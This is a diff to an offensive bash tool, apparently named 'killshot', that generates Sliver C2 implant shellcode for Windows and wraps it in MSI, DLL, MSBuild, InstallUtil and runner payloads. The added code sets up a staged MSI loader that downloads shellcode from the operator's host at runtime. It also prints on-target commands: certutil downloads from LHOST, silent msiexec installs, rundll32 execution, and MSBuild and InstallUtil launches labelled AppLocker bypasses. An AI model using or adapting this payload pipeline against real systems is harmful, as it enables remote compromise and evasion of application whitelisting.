@@ -55,6 +55,7 @@ show_help() {
     echo "    -h, --http PORT        HTTP file server port        (default: 8000)"
     echo "    -f, --framework NAME   sliver | msf                 (default: sliver)"
     echo "    -t, --type TYPE        beacon | session (sliver)    (default: beacon)"
+    echo "    --proto PROTO          mtls | http | https (sliver) (default: mtls)"
     echo "    -c, --cmd CMD          Custom command for potatoes"
     echo "    --params PARAMS        Custom params for --tool"
     echo "    -o, --output PATH      Output path for --tool/--potato"
@@ -107,19 +108,20 @@ elif grep -qi "kali" /etc/os-release 2>/dev/null; then
     PLATFORM="kali"
 fi
 
-# Auto-detect workspace and Go path based on platform
+# Auto-detect Go path based on platform
 if [ "$PLATFORM" = "exegol" ]; then
-    WORKSPACE="${WORKSPACE:-/workspace}"
     for gp in "$SCRIPT_DIR/go/bin" "/opt/my-resources/bin/go/bin"; do
         [ -f "$gp/go" ] && export PATH="$gp:$PATH" && break
     done
 else
-    WORKSPACE="${WORKSPACE:-/opt/killshot/output}"
-    mkdir -p "$WORKSPACE" 2>/dev/null || sudo mkdir -p "$WORKSPACE" 2>/dev/null && sudo chown "$(id -u):$(id -g)" "$WORKSPACE" 2>/dev/null || true
     for gp in "$SCRIPT_DIR/go/bin" "/opt/killshot/go/bin" "/usr/local/go/bin"; do
         [ -f "$gp/go" ] && export PATH="$gp:$PATH" && break
     done
 fi
+
+# Output directory: ./killshot/ under CWD (or WORKSPACE env override)
+WORKSPACE="${WORKSPACE:-$(pwd)/killshot}"
+mkdir -p "$WORKSPACE" 2>/dev/null
 
 MODE=""
 case "${1:-}" in
@@ -190,9 +192,11 @@ fi
 
 if [ "$MODE" = "serve" ]; then
     PORT="${1:-8000}"
-    echo "[*] Serving $WORKSPACE on port $PORT"
+    SERVE_DIR="${WORKSPACE:-$(pwd)/killshot}"
+    [ ! -d "$SERVE_DIR" ] && SERVE_DIR="$(pwd)"
+    echo "[*] Serving $SERVE_DIR on port $PORT"
     echo "[*] Ctrl+C to stop"
-    cd "$WORKSPACE" && exec python3 -m http.server "$PORT"
+    cd "$SERVE_DIR" && exec python3 -m http.server "$PORT"
 fi
 
 # ─── Mode: generate ──────────────────────────────────────────
@@ -202,6 +206,7 @@ LPORT="4444"
 HTTP_PORT="8000"
 FRAMEWORK="sliver"
 IMPLANT_TYPE="beacon"
+SLIVER_PROTO="mtls"
 POTATO_CMD_OVERRIDE=""
 TOOL_PARAMS_OVERRIDE=""
 OUTPUT_OVERRIDE=""
@@ -239,6 +244,7 @@ while [[ $# -gt 0 ]]; do
         -h|--http)      HTTP_PORT="$2"; shift 2;;
         -f|--framework) FRAMEWORK="$2"; shift 2;;
         -t|--type)      IMPLANT_TYPE="$2"; shift 2;;
+        --proto)        SLIVER_PROTO="$2"; shift 2;;
         -c|--cmd)       POTATO_CMD_OVERRIDE="$2"; shift 2;;
         --params)       TOOL_PARAMS_OVERRIDE="$2"; shift 2;;
         -o|--output)    OUTPUT_OVERRIDE="$2"; shift 2;;
@@ -305,20 +311,26 @@ if [ "$GEN_IMPLANT" = "1" ]; then
             rm -f /tmp/implant.bin
 
             if [ "$IMPLANT_TYPE" = "session" ]; then
-                GEN_CMD="generate --mtls ${LHOST}:${LPORT} --os windows --arch amd64 --format shellcode --save /tmp/implant.bin --skip-symbols --shellcode-encoder none"
+                GEN_CMD="generate --${SLIVER_PROTO} ${LHOST}:${LPORT} --os windows --arch amd64 --format shellcode --save /tmp/implant.bin --skip-symbols --shellcode-encoder none"
             else
-                GEN_CMD="generate beacon --mtls ${LHOST}:${LPORT} --os windows --arch amd64 --format shellcode --save /tmp/implant.bin --skip-symbols --shellcode-encoder none"
+                GEN_CMD="generate beacon --${SLIVER_PROTO} ${LHOST}:${LPORT} --os windows --arch amd64 --format shellcode --save /tmp/implant.bin --skip-symbols --shellcode-encoder none"
             fi
 
             echo "$GEN_CMD" > /tmp/sliver_gen.rc
             echo "exit" >> /tmp/sliver_gen.rc
             echo "[*] This may take a minute (Sliver is compiling)..."
 
+            # Set SLIVER_ROOT_DIR for non-default configs (exegol)
+            SLIVER_ENV=""
+            for sr in "/opt/my-resources/setup/sliver/.sliver" "$HOME/.sliver"; do
+                [ -d "$sr" ] && SLIVER_ENV="SLIVER_ROOT_DIR=$sr" && break
+            done
+
             # Try sliver-client first (connects to running daemon), fall back to sliver-server
             if [ -x "$SLIVER_CLIENT" ]; then
-                script -qec "timeout 180 $SLIVER_CLIENT console --rc /tmp/sliver_gen.rc" /dev/null 2>&1 | grep -E "Generating|Saved|Build|Compil|symbol|implant" || true
+                TERM=dumb script -qec "timeout 180 env $SLIVER_ENV $SLIVER_CLIENT --rc /tmp/sliver_gen.rc" /dev/null 2>&1 | grep -E "Generating|Build|Compil|symbol" | grep -v "/tmp/" || true
             elif [ -x "$SLIVER_SERVER" ]; then
-                script -qec "timeout 180 $SLIVER_SERVER --rc /tmp/sliver_gen.rc" /dev/null 2>&1 | grep -E "Generating|Saved|Build|Compil|symbol|implant" || true
+                TERM=dumb script -qec "timeout 180 env $SLIVER_ENV $SLIVER_SERVER --rc /tmp/sliver_gen.rc" /dev/null 2>&1 | grep -E "Generating|Build|Compil|symbol" | grep -v "/tmp/" || true
             fi
 
             if [ -f /tmp/implant.bin ]; then
@@ -620,9 +632,24 @@ if [ "$GEN_MSI" = "1" ]; then
 
     if [ -n "$IMPLANT_BIN" ]; then
         cd "$SCRIPT_DIR"
-        python3 gen_msi.py \
-            -i "$IMPLANT_BIN" \
-            -o "$WORKSPACE/update.msi" 2>&1 | grep -E "^\[" || true
+        IMPLANT_SIZE=$(stat -c%s "$IMPLANT_BIN" 2>/dev/null || stat -f%z "$IMPLANT_BIN" 2>/dev/null || echo 0)
+
+        if [ "$IMPLANT_SIZE" -gt 1048576 ]; then
+            # Large shellcode (>1MB): use staged loader that downloads at runtime
+            echo "[*] Large shellcode ($(( IMPLANT_SIZE / 1024 ))KB) — using staged MSI loader"
+            python3 gen_msi.py \
+                --url "http://$LHOST:$HTTP_PORT/beacon.bin" \
+                -i "$IMPLANT_BIN" \
+                -o "$WORKSPACE/update.msi" 2>&1 | grep -E "^\[" || true
+            # Move the encrypted shellcode to match the URL
+            [ -f "$WORKSPACE/update.bin" ] && mv "$WORKSPACE/update.bin" "$WORKSPACE/beacon.bin" && GENERATED+=("beacon.bin")
+        else
+            # Small shellcode: embed directly in DLL
+            python3 gen_msi.py \
+                -i "$IMPLANT_BIN" \
+                -o "$WORKSPACE/update.msi" 2>&1 | grep -E "^\[" || true
+        fi
+
         if [ -f "$WORKSPACE/update.msi" ]; then
             GENERATED+=("update.msi")
         elif [ -f "$WORKSPACE/update.dll" ]; then
@@ -705,5 +732,70 @@ else
 fi
 echo ""
 echo "[*] Serve: cd $WORKSPACE && python3 -m http.server $HTTP_PORT"
-echo "[*] On target: %TEMP%\\r.exe -remote http://$LHOST:$HTTP_PORT/<file>.enc"
+echo ""
+
+# Show on-target instructions per payload type
+HAS_MSI=0; HAS_RUNNER=0; HAS_STAGED=0; HAS_DLL=0; HAS_MSBUILD=0; HAS_INSTALLUTIL=0
+for f in "${GENERATED[@]}"; do
+    case "$f" in
+        update.msi)   HAS_MSI=1;;
+        runner.exe)   HAS_RUNNER=1;;
+        beacon.bin)   HAS_STAGED=1;;
+        update.dll)   HAS_DLL=1;;
+        build.xml)    HAS_MSBUILD=1;;
+        service.cs)   HAS_INSTALLUTIL=1;;
+    esac
+done
+
+if [ "$HAS_MSI" = "1" ]; then
+    echo "[*] MSI (AppLocker bypass via msiexec):"
+    if [ "$HAS_STAGED" = "1" ]; then
+        echo "    1. Start HTTP server (serves beacon.bin + update.msi)"
+        echo "    2. certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/update.msi %TEMP%\\u.msi"
+        echo "    3. msiexec /i %TEMP%\\u.msi /qn"
+        echo "    (MSI downloads shellcode from http://$LHOST:$HTTP_PORT/beacon.bin at runtime)"
+    else
+        echo "    certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/update.msi %TEMP%\\u.msi"
+        echo "    msiexec /i %TEMP%\\u.msi /qn"
+    fi
+    echo ""
+fi
+
+if [ "$HAS_DLL" = "1" ] && [ "$HAS_MSI" = "0" ]; then
+    echo "[*] DLL (rundll32 bypass):"
+    echo "    certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/update.dll %TEMP%\\u.dll"
+    echo "    rundll32.exe %TEMP%\\u.dll,DllRegisterServer 0"
+    echo ""
+fi
+
+if [ "$HAS_RUNNER" = "1" ]; then
+    echo "[*] Runner (polymorphic loader):"
+    echo "    certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/runner.exe %TEMP%\\r.exe"
+    echo "    %TEMP%\\r.exe -remote http://$LHOST:$HTTP_PORT/implant.enc"
+    # Show .enc files available
+    ENC_FILES=()
+    for f in "${GENERATED[@]}"; do
+        [[ "$f" == *.enc ]] && ENC_FILES+=("$f")
+    done
+    if [ ${#ENC_FILES[@]} -gt 1 ]; then
+        echo "    (also: ${ENC_FILES[*]})"
+    fi
+    echo ""
+fi
+
+if [ "$HAS_MSBUILD" = "1" ]; then
+    echo "[*] MSBuild (AppLocker bypass):"
+    echo "    certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/build.xml %TEMP%\\b.xml"
+    echo "    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe %TEMP%\\b.xml"
+    echo ""
+fi
+
+if [ "$HAS_INSTALLUTIL" = "1" ]; then
+    echo "[*] InstallUtil (AppLocker bypass):"
+    echo "    certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/service.cs %TEMP%\\s.cs"
+    echo "    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library /out:%TEMP%\\s.dll %TEMP%\\s.cs"
+    echo "    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\\s.dll"
+    echo ""
+fi
+
 echo "============================================"
